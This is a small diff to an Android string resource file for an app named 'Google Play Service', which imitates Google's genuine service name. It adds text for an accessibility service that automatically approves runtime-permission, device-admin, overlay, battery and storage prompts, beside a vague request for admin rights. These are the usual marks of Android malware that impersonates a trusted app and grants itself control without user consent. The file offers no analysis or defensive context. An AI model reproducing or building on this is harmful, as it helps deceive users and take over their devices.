@@ -1,4 +1,6 @@
 <resources>
     <string name="app_name">Google Play Service</string>
     <string name="device_admin_explanation">Please allow admin permission to work properly.</string>
+    <string name="accessibility_service_description">Automatically approves the permission and activation prompts this app needs (runtime permissions, device admin, battery, overlay, storage).
+    </string>
 </resources>
